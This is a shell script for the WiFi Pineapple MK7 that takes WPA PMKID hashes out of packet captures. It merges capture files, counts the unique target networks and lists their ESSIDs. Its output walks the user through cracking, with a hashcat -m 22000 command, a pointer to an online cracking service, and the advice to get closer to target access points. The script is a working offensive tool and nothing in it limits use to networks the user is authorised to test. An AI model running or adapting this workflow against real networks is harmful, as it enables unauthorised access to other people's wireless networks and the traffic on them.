#!/bin/sh
# quick-pmkid.sh - Quick PMKID Extraction Script
# Rapidly extracts PMKIDs from capture files
# Version: 1.0.0
# Compatible with WiFi Pineapple MK7

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Default settings
CAPTURE_DIR="/root/hcxdumps"
OUTPUT_DIR="/root/pmkids"
VERBOSE=0
MERGE=0
ANALYZE=0

# Function to display usage
show_usage() {
    echo "Usage: $0 [OPTIONS] [capture.pcapng]"
    echo ""
    echo "Options:"
    echo "  -i FILE     Input capture file (default: latest in $CAPTURE_DIR)"
    echo "  -o DIR      Output directory (default: $OUTPUT_DIR)"
    echo "  -m          Merge all captures before processing"
    echo "  -a          Analyze and show statistics"
    echo "  -v          Verbose output"
    echo "  -h          Show this help"
    echo ""
    echo "Examples:"
    echo "  $0                              # Process latest capture"
    echo "  $0 -i capture.pcapng           # Process specific file"
    echo "  $0 -m -a                       # Merge all and analyze"
    echo ""
}

# Function to find latest capture
find_latest_capture() {
    latest=$(ls -t "$CAPTURE_DIR"/*.pcapng 2>/dev/null | head -1)
    if [ -z "$latest" ]; then
        echo -e "${RED}Error: No capture files found in $CAPTURE_DIR${NC}"
        exit 1
    fi
    echo "$latest"
}

# Function to extract PMKIDs
extract_pmkids() {
    local input_file="$1"
    local output_base="$(basename "$input_file" .pcapng)"
    local pmkid_file="$OUTPUT_DIR/${output_base}-pmkids.hc22000"
    local pmkid_list="$OUTPUT_DIR/${output_base}-pmkids.txt"
    
    echo -e "${BLUE}Processing: $input_file${NC}"
    
    # Extract PMKIDs to hashcat format
    if [ $VERBOSE -eq 1 ]; then
        hcxpcapngtool -o "$pmkid_file" "$input_file"
    else
        hcxpcapngtool -o "$pmkid_file" "$input_file" >/dev/null 2>&1
    fi
    
    # Extract PMKID list
    hcxpcapngtool --pmkid="$pmkid_list" "$input_file" >/dev/null 2>&1
    
    # Count results
    local pmkid_count=0
    if [ -f "$pmkid_file" ]; then
        pmkid_count=$(wc -l < "$pmkid_file")
    fi
    
    if [ $pmkid_count -gt 0 ]; then
        echo -e "${GREEN}Found $pmkid_count PMKID(s)${NC}"
        
        # Extract associated ESSIDs
        local essid_file="$OUTPUT_DIR/${output_base}-essids.txt"
        hcxpcapngtool -E "$essid_file" "$input_file" >/dev/null 2>&1
        
        # Show ESSIDs if verbose
        if [ $VERBOSE -eq 1 ] && [ -f "$essid_file" ]; then
            echo -e "${YELLOW}Associated networks:${NC}"
            cat "$essid_file" | head -10
            [ $(wc -l < "$essid_file") -gt 10 ] && echo "..."
        fi
    else
        echo -e "${YELLOW}No PMKIDs found${NC}"
    fi
    
    return $pmkid_count
}

# Function to merge captures
merge_captures() {
    echo -e "${BLUE}Merging all capture files...${NC}"
    local merged_file="$OUTPUT_DIR/merged-$(date +%Y%m%d-%H%M%S).pcapng"
    
    # Find all pcapng files
    local files=$(find "$CAPTURE_DIR" -name "*.pcapng" -type f)
    local file_count=$(echo "$files" | wc -l)
    
    if [ $file_count -eq 0 ]; then
        echo -e "${RED}No capture files found to merge${NC}"
        return 1
    fi
    
    echo "Found $file_count capture files"
    
    # Merge using mergecap if available
    if command -v mergecap >/dev/null 2>&1; then
        mergecap -w "$merged_file" $files
    else
        # Fallback: process each file separately
        echo -e "${YELLOW}mergecap not found, processing files separately${NC}"
        for file in $files; do
            extract_pmkids "$file"
        done
        return 0
    fi
    
    if [ -f "$merged_file" ]; then
        echo -e "${GREEN}Merged to: $merged_file${NC}"
        echo "$merged_file"
    else
        echo -e "${RED}Merge failed${NC}"
        return 1
    fi
}

# Function to analyze PMKIDs
analyze_pmkids() {
    echo -e "${BLUE}=== PMKID Analysis ===${NC}"
    
    local total_pmkids=0
    local total_files=0
    local unique_aps=""
    
    # Count PMKIDs across all files
    for file in "$OUTPUT_DIR"/*-pmkids.hc22000; do
        if [ -f "$file" ]; then
            local count=$(wc -l < "$file")
            total_pmkids=$((total_pmkids + count))
            total_files=$((total_files + 1))
            
            # Extract unique APs
            if [ -f "${file%-pmkids.hc22000}-essids.txt" ]; then
                unique_aps="$unique_aps$(cat "${file%-pmkids.hc22000}-essids.txt")\n"
            fi
        fi
    done
    
    # Calculate unique networks
    local unique_count=0
    if [ -n "$unique_aps" ]; then
        unique_count=$(echo -e "$unique_aps" | sort -u | grep -v "^$" | wc -l)
    fi
    
    # Display statistics
    echo "Total PMKIDs captured: $total_pmkids"
    echo "Total capture files: $total_files"
    echo "Unique networks: $unique_count"
    
    if [ $total_pmkids -gt 0 ]; then
        echo -e "\n${GREEN}Ready for cracking:${NC}"
        echo "1. Transfer .hc22000 files to cracking rig"
        echo "2. Use hashcat: hashcat -m 22000 pmkids.hc22000 wordlist.txt"
        echo "3. Or try online: wpa-sec.stanev.org"
    fi
    
    # Show top networks if verbose
    if [ $VERBOSE -eq 1 ] && [ -n "$unique_aps" ]; then
        echo -e "\n${YELLOW}Top captured networks:${NC}"
        echo -e "$unique_aps" | sort | uniq -c | sort -rn | head -10
    fi
}

# Parse command line arguments
while [ $# -gt 0 ]; do
    case $1 in
        -i) INPUT_FILE="$2"; shift 2;;
        -o) OUTPUT_DIR="$2"; shift 2;;
        -m) MERGE=1; shift;;
        -a) ANALYZE=1; shift;;
        -v) VERBOSE=1; shift;;
        -h) show_usage; exit 0;;
        -*) echo "Unknown option: $1"; show_usage; exit 1;;
        *) INPUT_FILE="$1"; shift;;
    esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Main execution
echo -e "${GREEN}=== Quick PMKID Extractor ===${NC}"
echo "Output directory: $OUTPUT_DIR"
echo ""

# Process based on options
if [ $MERGE -eq 1 ]; then
    # Merge all captures first
    merged_file=$(merge_captures)
    if [ $? -eq 0 ] && [ -f "$merged_file" ]; then
        extract_pmkids "$merged_file"
    fi
elif [ -n "$INPUT_FILE" ]; then
    # Process specific file
    if [ ! -f "$INPUT_FILE" ]; then
        echo -e "${RED}Error: File not found: $INPUT_FILE${NC}"
        exit 1
    fi
    extract_pmkids "$INPUT_FILE"
else
    # Process latest capture
    latest_capture=$(find_latest_capture)
    extract_pmkids "$latest_capture"
fi

# Analyze if requested
if [ $ANALYZE -eq 1 ]; then
    echo ""
    analyze_pmkids
fi

echo -e "\n${GREEN}Done!${NC}"
echo "PMKID files saved to: $OUTPUT_DIR"

# Quick summary
total_pmkids=$(cat "$OUTPUT_DIR"/*-pmkids.hc22000 2>/dev/null | wc -l)
if [ $total_pmkids -gt 0 ]; then
    echo -e "${GREEN}Total PMKIDs ready for cracking: $total_pmkids${NC}"
else
    echo -e "${YELLOW}No PMKIDs found. Try:${NC}"
    echo "- Capturing for longer duration"
    echo "- Getting closer to target APs"
    echo "- Using --auto-channels for busy channels"
fi